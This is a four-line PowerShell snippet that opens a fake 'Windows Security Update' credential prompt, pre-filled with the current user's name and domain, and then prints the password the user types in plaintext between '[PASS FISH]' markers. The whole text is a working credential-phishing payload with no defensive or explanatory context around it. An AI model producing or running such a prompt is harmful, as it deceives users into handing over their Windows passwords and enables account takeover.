$cred=$host.ui.promptforcredential('Windows Security Update','',$env:UserName,$env:UserDomainName);
echo '---------[PASS FISH]----------'
echo $cred.getnetworkcredential().password;
echo '---------[PASS FISH]----------'
